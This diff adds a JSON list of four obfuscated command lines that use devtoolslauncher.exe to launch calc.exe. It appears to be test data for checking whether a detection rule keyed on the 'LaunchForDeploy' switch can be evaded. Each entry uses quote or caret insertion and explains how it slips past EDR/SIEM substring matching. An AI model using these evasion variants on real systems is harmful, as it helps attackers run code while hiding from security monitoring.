@@ -1,0 +1,18 @@
+[
+  {
+    "output": "devtoolslauncher.exe LaunchFor''Deploy C:\\Windows\\System32\\calc.exe",
+    "explanation": "Insertion technique: Inserting a pair of adjacent empty single quotes inside the target functional keyword component ('LaunchFor''Deploy'). If the command is initialized via a native PowerShell testing harness or context, the script engine evaluates and drops the inner string boundaries automatically at runtime. This reconstructs the cohesive option argument natively while breaking the rigid sequential text validation check for 'LaunchForDeploy'."
+  },
+  {
+    "output": "devtoolslauncher.exe \"LaunchForDeploy\" C:\\Windows\\System32\\calc.exe",
+    "explanation": "Insertion technique: Enclosing the mandatory operational switch keyword inside explicit double quotes. The native Windows Win32 API process creation layer strips out outer quotation boundaries transparently during parameter token array assembly, passing the expected parameter token cleanly to the application while shifting the literal character structure stored inside raw process logs."
+  },
+  {
+    "output": "cmd.exe /c devtoolslauncher.exe LaunchForDe^ploy C:\\Windows\\System32\\calc.exe",
+    "explanation": "Insertion technique: Routing execution through a cmd.exe environment context allows the integration of a command shell caret escape operator ('^') directly into the middle of the targeted option switch name ('LaunchForDe^ploy'). The parent command interpreter consumes and filters out the caret modifier entirely prior to initiating the child context, generating an EDR/SIEM process log footprint that completely subverts the continuous literal substring check."
+  },
+  {
+    "output": "devtoolslauncher.exe LaunchFor\"\"Deploy C:\\Windows\\System32\\calc.exe",
+    "explanation": "Insertion technique: Injecting a pair of adjacent empty double quotes within the required string parameter ('LaunchFor\"\"Deploy'). The underlying operating system argument tokenization handler merges the adjacent unquoted sub-strings flawlessly prior to populating the program's argument vector, safely preserving execution logic while breaking simple sequential pattern matches."
+  }
+]
